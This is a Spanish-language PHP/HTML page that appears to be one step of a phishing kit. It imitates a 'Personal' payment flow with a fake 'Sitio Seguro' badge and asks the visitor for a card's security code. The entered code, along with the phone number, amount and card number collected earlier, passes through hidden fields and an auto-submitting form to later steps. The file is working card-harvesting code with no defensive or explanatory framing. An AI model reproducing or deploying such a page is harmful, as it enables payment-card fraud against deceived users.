<?php
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';

if(isset($_POST['cv'])) {
    ?>
    <form id="autoForm" method="POST" action="step5.php">
        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
        <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
        <input type="hidden" name="cv" value="<?php echo htmlspecialchars($_POST['cv']); ?>">
    </form>
    <script>document.getElementById('autoForm').submit();</script>
    <?php
    exit;
}

// Detectar tipo de tarjeta
$tipo_tarjeta = 'visa';
if (preg_match('/^5[1-5]/', $card) || preg_match('/^2[2-7]/', $card)) {
    $tipo_tarjeta = 'mastercard';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Código de seguridad | Personal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #2a2a2a;
            color: #fff;
            min-height: 100vh;
        }
        
        .header {
            background: #2a2a2a;
            border-bottom: 1px solid #3a3a3a;
            color: #fff;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo { font-size: 18px; font-weight: 500; }
        .sitio-seguro { font-size: 12px; }
        
        .container {
            max-width: 600px;
            margin: 60px auto;
            padding: 0 20px;
        }
        
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 50px;
        }
        
        /* TARJETA TRASERA */
        .tarjeta {
            width: 100%;
            max-width: 400px;
            height: 240px;
            margin: 0 auto 50px;
            border-radius: 16px;
            padding: 0;
            position: relative;
            background: <?php echo $tipo_tarjeta === 'mastercard' ? 'linear-gradient(135deg, #f79e1b 0%, #eb001b 100%)' : '#1e3a8a'; ?>;
            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
        }
        
        .banda-magnetica {
            width: 100%;
            height: 50px;
            background: #000;
            position: absolute;
            top: 35px;
        }
        
        .cvv-strip {
            position: absolute;
            bottom: 70px;
            right: 30px;
            background: #fff;
            padding: 12px 20px;
            border-radius: 6px;
            color: #000;
            font-family: 'Courier New', Courier, monospace;
            font-size: 20px;
            letter-spacing: 3px;
        }
        
        .tarjeta-firma {
            position: absolute;
            bottom: 70px;
            left: 30px;
            width: 200px;
            height: 40px;
            background: #fff;
            border-radius: 4px;
        }
        
        /* FORMULARIO */
        .form-group {
            margin-bottom: 30px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #fff;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #444;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #5d8bf4;
        }
        
        .help-text {
            font-size: 13px;
            color: #999;
            margin-top: 6px;
        }
        
        .botones {
            display: flex;
            gap: 12px;
            margin-top: 40px;
        }
        
        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-volver {
            background: transparent;
            border: 1px solid #5d8bf4;
            color: #5d8bf4;
        }
        
        .btn-volver:hover {
            background: rgba(93, 139, 244, 0.1);
        }
        
        .btn-siguiente {
            background: #5d8bf4;
            color: #fff;
        }
        
        .btn-siguiente:hover { background: #4a7de8; }
        .btn-siguiente:disabled {
            background: #444;
            cursor: not-allowed;
            opacity: 0.5;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">personal flow</div>
        <div class="sitio-seguro">🔒 Sitio Seguro</div>
    </div>

    <div class="container">
        <h1>Datos de la tarjeta</h1>

        <div class="tarjeta">
            <div class="banda-magnetica"></div>
            <div class="tarjeta-firma"></div>
            <div class="cvv-strip" id="displayCVV">123</div>
        </div>

        <form method="POST" action="step4.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
            
            <div class="form-group">
                <label>Código de seguridad</label>
                <input type="text" name="cv" id="cvv" placeholder="123" maxlength="4" required autocomplete="off">
                <div class="help-text">Últimos tres dígitos al dorso de la tarjeta</div>
            </div>

            <div class="botones">
                <button type="button" class="btn-volver" onclick="window.history.back()">Anterior</button>
                <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Siguiente</button>
            </div>
        </form>
    </div>

    <script src="javascript/query.min.js"></script>
    <script>
        $(document).ready(function(){
            $('#cvv').on('input', function(){
                var valor = $(this).val();
                
                // Mostrar en tarjeta
                $('#displayCVV').text(valor || '123');
                
                // Validar
                if (valor.length >= 3) {
                    $('#btnContinuar').prop('disabled', false);
                } else {
                    $('#btnContinuar').prop('disabled', true);
                }
            });
            
            // Solo números
            $('#cvv').on('keypress', function(e){
                if (e.which < 48 || e.which > 57) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>